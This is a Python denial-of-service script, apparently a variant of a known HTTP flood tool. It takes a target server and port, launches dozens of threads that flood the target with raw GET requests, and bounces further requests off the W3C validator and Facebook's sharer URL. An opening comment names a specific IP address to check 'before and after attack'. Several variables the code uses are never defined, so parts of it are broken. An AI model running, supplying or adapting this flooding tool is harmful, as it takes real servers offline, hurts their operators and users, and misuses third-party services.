#ping 89.116.133.239 before and after attack

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

def HAXSTROKE_bots():
    global bots
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    

def bots_reloading(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            print(GR + "► Reloading some requests for keep attacking ◄")
            time.sleep(.1)
    except:
        time.sleep(.1)

def down_it(item):
    try:
        while True:
            packet = str(
                "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " +
                random.choice(user_agent) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print(P + "► Sending HTTP Requests please be patient ◄")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        time.sleep(.1)

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():
    while True:
        item = w.get()
        bots_reloading(random.choice(bots) + "http://" + host)
        w.task_done()

def slowprint(s):
 for c in s + '/sl':
    sys.stdout.write(c)
    sys.stdout.flush() # defeat buffering
    time.sleep(8. / 90)

def usage():
    W = "\033[0m"  # White color
    P = "\033[95m"  # Purple color
    print(W +" "+ P +" "+ W +" "+ W +" "+ P +" "+ W )
    sys.exit()

def get_parameters():
    global host, port, thr, item
    optp = OptionParser(add_help_option=False, epilog="Suicide")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const",
                    dest="loglevel",
                    const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-l", "--level", type="int", dest="level", help="default 135 -t 135")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')

    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.level is None:
        thr = 60
    else:
        thr = opts.level

    # reading headers
    global data
    headers = open("httpconnection.txt", "r")
    data = headers.read()
    headers.close()

    # task queue are q,w
    global q, w
    q = Queue()
    w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[94m▷ ", host, " connecting on port: ", str(port), " level of attack: ", str(thr),
          " ◁\033[0m")
    print("\033[94m▷ Loading threads for start attack... ◁")
    HAXSTROKE_bots()
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91mcheck server ip and port\033[0m")
        usage()

    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
        t2 = threading.Thread(target=dos2)
        t2.daemon = True  # if thread is exist, it dies
        t2.start()
        start = time.time()
        # tasking
        item = 0
        while True:
            if (item > 1800):  # for no memory crash
                item = 0
                time.sleep(.1)
            item = item + 1
            q.put(item)
            w.put(item)
    q.join()
    w.join()
